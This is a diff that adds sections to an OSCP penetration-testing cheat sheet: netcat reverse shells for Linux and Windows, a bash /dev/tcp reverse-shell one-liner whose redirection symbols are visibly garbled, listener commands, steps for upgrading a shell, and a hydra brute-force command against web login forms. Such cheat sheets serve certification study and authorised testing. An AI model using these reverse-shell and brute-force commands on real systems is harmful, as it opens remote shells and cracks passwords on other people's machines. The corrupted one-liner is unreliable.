@@ -1,5 +1,43 @@
 # OSCP-Cheat-Sheet
 
+## Common Commands
+
+<code>python -m SimpleHTTPServer [PORT]</code>
+
+### Upgrading Reverse Shell
+
+Follow steps found [here](https://medium.com/bugbountywriteup/pimp-my-shell-5-ways-to-upgrade-a-netcat-shell-ecd551a180d2)
+
+<code>python -c 'import pty;pty.spawn("/bin/bash")'</code>
+
+<code>export TERM=screen</code>
+
+Background the shell with <code>Ctrl+Z</code>
+
+<code>stty raw echo</code>
+
+<code>fg</code> 
+
+Hit Return 2x
+
+### Netcat Listener
+
+Linux: <code>nc -lnvp [PORT]</code>
+
+Windows: <code>nc.exe -lnvcp [PORT]
+
+## Reverse Shells
+
+### Netcat
+
+Linux: <code>nc -nv [IP] [PORT] -e /bin/bash</code>
+
+Windows: <code>nc.exe -nv [IP] [PORT] -e cmd.exe</code>
+
+### Bash One-Liners
+
+<code> 0ge&118-;exec 118gele/dev/tcp/[IP]/[PORT];sh ge&118 le&118 2le&118</code>
+
 ## NMAP
 
 ### TCP 
@@ -22,11 +60,19 @@
 
 <code>./smbver.sh [IP]</code> [Found Here](https://github.com/rewardone/OSCPRepo/blob/master/scripts/recon_enum/smbver.sh)
 
-## Werb Server
+## Werb Servers
 
 <code>dirb [URL]</code>
 
 <code>nikto -h [URL]</code>
+
+### Wordlists
+
+<code>cewl [URL]</code>
+
+### Bruteforcing POST requests
+
+<code>hydra -l/-L [USERNAME/USER_LIST] -P [PASSWORDLIST] [IP] http-form-post "[ENDPOINT]:[POST_PARAMETERS]&User=^USER^&Password=^PASS^:[FAILED_LOGIN_ERROR]."</code>
 
 ### ASP / ASP.NET
 
